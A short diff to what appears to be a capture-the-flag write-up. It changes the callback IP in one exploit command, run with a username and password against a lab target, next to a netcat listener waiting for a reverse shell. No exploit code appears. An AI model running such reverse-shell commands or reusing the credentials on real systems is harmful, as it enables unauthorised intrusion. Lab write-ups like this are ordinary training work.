@@ -52,6 +52,6 @@ $ nc -nvlp 4443
 
 ```
 
-$ ./exploit.py -r 10.10.10.191 -u fergus -p RolandDeschain -l 10.10.16.16 -lp 4443
+$ ./exploit.py -r 10.10.10.191 -u fergus -p RolandDeschain -l 10.10.16.12 -lp 4443
 
 ```
